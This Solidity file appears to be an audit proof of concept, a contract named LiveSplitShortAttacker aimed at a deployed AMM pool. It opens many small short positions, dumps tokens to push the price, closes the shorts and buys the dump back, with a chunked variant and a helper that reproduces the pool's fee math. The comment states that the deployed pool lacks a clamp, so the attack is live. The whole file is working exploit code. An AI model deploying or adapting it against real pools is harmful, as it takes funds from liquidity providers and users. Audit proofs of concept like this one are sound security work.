// SPDX-License-Identifier: BUSL-1.1
pragma solidity ^0.8.24;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface ILivePool {
    function swap(uint256 amountIn, uint256 minAmountOut, bool tokenToUsdc, address recipient) external;
    function openShort(uint256 usdcNotional, uint256 minAirUsdOut, address recipient) external;
    function closeShort(uint256 nftId, uint256 minUsdcOut) external;
    function backedAirToken() external view returns (uint256);
    function backedAirUsd() external view returns (uint256);
}

/// Audit R4 PoC against the DEPLOYED contracts (5197494): k small shorts, dump,
/// close all, buy the dump back. Same transaction here for convenience; the deployed
/// pool has no clamp, so nothing requires it to be atomic.
contract LiveSplitShortAttacker is IERC721Receiver {
    ILivePool public immutable pool;
    uint256 private lastId;
    address private immutable tokenAddr;

    constructor(address pool_, address usdc_, address token_) {
        pool = ILivePool(pool_);
        tokenAddr = token_;
        IERC20(usdc_).approve(pool_, type(uint256).max);
        IERC20(token_).approve(pool_, type(uint256).max);
    }

    function attack(uint256 notional, uint256 k, uint256 dump) external {
        uint256[] memory ids = new uint256[](k);
        for (uint256 i; i < k; i++) {
            pool.openShort(notional, 0, address(this));
            ids[i] = lastId;
        }
        pool.swap(dump, 0, true, address(this));
        for (uint256 i; i < k; i++) pool.closeShort(ids[i], 0);
        pool.swap(_usdcFor(dump), 0, false, address(this));
    }

    function attackChunked(uint256 notional, uint256 k, uint256 dump, uint256 j) external {
        uint256[] memory ids = new uint256[](k);
        for (uint256 i; i < k; i++) {
            pool.openShort(notional, 0, address(this));
            ids[i] = lastId;
        }
        for (uint256 i; i < j; i++) pool.swap(dump / j, 0, true, address(this));
        uint256 sold = (dump / j) * j;
        for (uint256 i; i < k; i++) pool.closeShort(ids[i], 0);
        uint256 got;
        for (uint256 i; i < j; i++) {
            uint256 want = (sold - got) / (j - i);
            uint256 t0 = IERC20(tokenAddr).balanceOf(address(this));
            pool.swap(_usdcFor(want), 0, false, address(this));
            got += IERC20(tokenAddr).balanceOf(address(this)) - t0;
        }
    }

    // Deployed _cpAmountOut: fee floor-rounded, swapFeeBps = 100.
    function _cp(uint256 a, uint256 ri, uint256 ro) internal pure returns (uint256) {
        uint256 raw = a * ro / (ri + a);
        uint256 fee = a * ro * 100 / (ri * 10_000);
        return raw <= fee ? 0 : raw - fee;
    }

    function _usdcFor(uint256 want) internal view returns (uint256) {
        uint256 y = pool.backedAirUsd();
        uint256 x = pool.backedAirToken();
        uint256 lo = 1;
        uint256 hi = 1;
        while (_cp(hi, y, x) < want) hi *= 2;
        while (lo < hi) {
            uint256 mid = (lo + hi) / 2;
            if (_cp(mid, y, x) >= want) hi = mid; else lo = mid + 1;
        }
        return lo;
    }

    function onERC721Received(address, address, uint256 tokenId, bytes calldata) external returns (bytes4) {
        lastId = tokenId;
        return IERC721Receiver.onERC721Received.selector;
    }
}
